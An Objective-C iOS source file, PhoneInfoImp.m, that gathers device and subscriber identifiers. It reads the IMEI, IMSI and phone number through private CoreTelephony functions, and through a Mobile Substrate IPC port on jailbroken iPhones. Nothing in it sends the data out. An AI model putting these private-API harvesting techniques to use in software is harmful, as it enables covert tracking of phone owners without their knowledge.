//
//  PhoneInfoImp.m
//  PhoneInfo
//
//  Created by Dominique  Mayrand on 11/9/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "PhoneInfoImp.h"
#import "UIDevice-IOKitExtensions.h"
#import "GetCellInfo.h"
#import "CTTelephonyNetworkInfo.h"
#import "CTCarrier.h"
#import "CoreTelephonyS.h"
#import "MessagePortIPCSender.h"
#import "DefStd.h"
#import "SystemUtilsImpl.h"

#include <sys/types.h>
#include <sys/sysctl.h>


#define PRIVATE_PATH "/System/Library/PrivateFrameworks/CoreTelephony.framework/CoreTelephony"


@interface PhoneInfoImp (private)
	-(CTCarrier*) getCarrier;
@end



@implementation PhoneInfoImp

struct CTServerConnection *sc = NULL;
struct CTResult result;

extern NSString *CTSIMSupportCopyMobileSubscriberIdentity();
extern NSString *CTSettingCopyMyPhoneNumber();


void callback2() { DLog(@"Callback2"); }


- (id) init {
	//DLog(@"init PhoneInfoCore");
	self = [super init];
	if(self)
	{
		sc = _CTServerConnectionCreate(kCFAllocatorDefault, callback2, NULL);
		if(sc == NULL)
		{
			//DLog(@"sc not created");
		}
	}
	return (self);
}

- (NSString*) getIMEI {
	// #1 ioreg method
	if(mIMEI == nil || [mIMEI length] == 0)
	{
		// If not use ioreg method
		DLog(@"Allocating UIDevice");
		[mIMEI release];
		mIMEI = [[UIDevice currentDevice] imei];
		[mIMEI retain];
	}
	
	// #2 Telephony API
	if(mIMEI == nil || [mIMEI length] == 0)
	{
		// This has not been tested on CDMA devices
		[mIMEI release];
		DLog(@"From deviceIdentidy");
		struct CTResult result = {0};
		NSString *deviceIdentity = nil;
		
		//DLog(@"Copy deviceIdentity");
		_CTServerConnectionCopyMobileIdentity(&result, sc, &deviceIdentity);
		mIMEI = deviceIdentity;
		[mIMEI retain];
		[deviceIdentity release];
	}
	
	// #3 Telephony API (crashing)
//	if (mIMEI == nil || [mIMEI length] == 0) {
//		[mIMEI release];
//		DLog (@"Going to get IMEI from C function of telephony");
//		NSString * imei = [NSString stringWithCString:_CTGetIMEI() encoding:NSUTF8StringEncoding];
//		mIMEI = imei;
//		DLog (@"Got IMEI from C function of telephony = %@", mIMEI);
//		[mIMEI retain];
//	}
	
	// #4 Mobile substrate
	if (mIMEI == nil || [mIMEI length] == 0) {
		[mIMEI release];
		NSString *deviceModel = [SystemUtilsImpl deviceModel]; // iPhonex,x iPodx,x or iPadx,x
		deviceModel = [deviceModel lowercaseString];
		NSRange iphoneRange = [deviceModel rangeOfString:@"iphone"];
		if (iphoneRange.location != NSNotFound) {
			DLog(@"Get IMEI using mobile substrate");
			MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kIMEIGetterMessagePort];
			[messagePortSender writeDataToPort:[NSData data]];
			NSData *imeiData = [messagePortSender mReturnData];
			mIMEI = [[NSString alloc] initWithData:imeiData encoding:NSUTF8StringEncoding];
			[messagePortSender release];
		} else {
			DLog (@"Get device identifier as IMEI for iPad, iPod");
			mIMEI = [[UIDevice currentDevice] uniqueIdentifier];
			[mIMEI retain];
		}
	}
	
	//DLog(@"getIMEI returned with IMEI = %@", mIMEI);
	return mIMEI;
}

- (NSString*) getIMSI {
	void *kit		= dlopen(PRIVATE_PATH,RTLD_LAZY); 
	NSString *imsi	= nil;
	int (*CTSIMSupportCopyMobileSubscriberIdentity)()	= dlsym (kit, "CTSIMSupportCopyMobileSubscriberIdentity");
	imsi			= (NSString*) CTSIMSupportCopyMobileSubscriberIdentity(nil);
	dlclose(kit); 	
	return [imsi autorelease];
}

-(NSString*) getPhoneNumber
{
	//DLog(@"setPhoneNumber");
	NSString *phoneNumber = CTSettingCopyMyPhoneNumber();
	if(!phoneNumber){
		//DLog(@"Search in user default");
		phoneNumber = [[[NSUserDefaults standardUserDefaults] stringForKey:@"SBFormattedPhoneNumber"] retain];
	}
	[phoneNumber autorelease];
	return phoneNumber;
}

-(NSString*) getMobileCountryCode
{
	CTCarrier* carrier = [self getCarrier];
	NSString *val = nil;
	if(carrier)
	{
		val = [carrier mobileCountryCode];
	}
	return val;
}

-(NSString*) getMobileNetworkCode
{
	CTCarrier* carrier = [self getCarrier];
	NSString *val = nil;
	if(carrier)
	{
		val = [carrier mobileNetworkCode];
	}
	return val;
}

-(NSString*) getNetworkName
{
	CTCarrier* carrier = [self getCarrier];
	NSString *val = nil;
	if(carrier)
	{
		val = [carrier carrierName];
	}
	return val;
}

-(NSString*) getDeviceInfo
{
//	NSString *value = [[NSString alloc] initWithFormat:@"Name:%@, SystemName:%@, SystemVersion:%@, Model:%@, LocalizedMedol:%@",
//									[[UIDevice currentDevice] name],
//									[[UIDevice currentDevice] systemName],
//									[[UIDevice currentDevice] systemVersion],
//									[[UIDevice currentDevice] model],
//									[[UIDevice currentDevice] localizedModel]];
//	[value autorelease];
	
	NSString *value = [NSString stringWithFormat:@"iOS %@", [[UIDevice currentDevice] systemVersion]];
	return value;
}

-(NSString*) getDeviceModel
{
	//return [UIDevice currentDevice].model;
	
	NSString *deviceModel = [NSString stringWithString:[SystemUtilsImpl deviceModelVersion]]; 
	return (deviceModel);
}

-(NSString*) getOSVersion
{
	return [UIDevice currentDevice].systemVersion;
	
}

-(NetworkType) getNetworkType
{
	NetworkType nt = kNetworkTypeGSM;
	size_t size;
	
	// Set 'oldp' parameter to NULL to get the size of the data
	// returned so we can allocate appropriate amount of space
	sysctlbyname("hw.machine", NULL, &size, NULL, 0); 
	
	// Allocate the space to store name
	char *name = malloc(size);
	
	// Get the platform name
	sysctlbyname("hw.machine", name, &size, NULL, 0);
	
	// Place name into a string
	NSString *platform = [NSString stringWithUTF8String:name];
	
	// Done with this
	free(name);
	
	if ([platform isEqualToString:@"iPhone1,1"])	nt = kNetworkTypeGSM; // iPhone 1G
    if ([platform isEqualToString:@"iPhone1,2"])	nt = kNetworkTypeGSM; // iPhone 3G
    if ([platform isEqualToString:@"iPhone2,1"])	nt = kNetworkTypeGSM; // iPhone 3GS
    if ([platform isEqualToString:@"iPhone3,1"])	nt = kNetworkTypeGSM; // iPhone 4
	if ([platform isEqualToString:@"iPhone3,3"])	nt = kNetworkTypeGSM; // iPhone 4 CDMA Verizon
    if ([platform isEqualToString:@"iPod1,1"])		nt = kNetworkTypeWIFIOnly; // iPod Touch 1G
    if ([platform isEqualToString:@"iPod2,1"])		nt = kNetworkTypeWIFIOnly; // iPod Touch 2G
	if ([platform isEqualToString:@"iPod3,1"])		nt = kNetworkTypeWIFIOnly; // iPod Touch 3G
    if ([platform isEqualToString:@"iPod4,1"])      nt = kNetworkTypeWIFIOnly; // iPod Touch 4G
    if ([platform isEqualToString:@"iPad1,1"])      nt = kNetworkTypeWIFIOnly; // iPad 1;
    if ([platform isEqualToString:@"iPad2,1"])      nt = kNetworkTypeWIFIOnly; // iPad 2 (WiFi)
    if ([platform isEqualToString:@"iPad2,2"])      nt = kNetworkTypeGSM; // iPad 2 (GSM)";
    if ([platform isEqualToString:@"iPad2,3"])      nt = kNetworkTypeCDMA; //iPad 2 (CDMA)
    //if ([platform isEqualToString:@"i386"])         return @"Simulator";

	return nt;
}

-(NSString*) getMEID
{
	return @"-1";
}

// Private methods
-(CTCarrier*) getCarrier
{
	//DLog(@"TelephonyNetworkInfo");
	CTCarrier *carrier = nil;
	
	CTTelephonyNetworkInfo *netInfo = [[CTTelephonyNetworkInfo alloc] init];
	if(netInfo)
	{
		//DLog(@"Subscriber cellular provider");
		carrier = [netInfo subscriberCellularProvider];
		//DLog(@"setMCC");
		[netInfo release];
	}
	return carrier;
}

- (void) dealloc
{
	//DLog(@"PhoneInfo core dealloc");
	if(	mIMEI )
	{
		[mIMEI release];
	}
	
	if( mMEID )
	{
		[mMEID release];
	}
	if(sc)
	{
		//DLog(@"Freeing ServerConnection");
		//_CTServerConnectionDestroy(sc);
		//DLog(@"ServerConnection freed");
	}
	
	[super dealloc];
}

@end
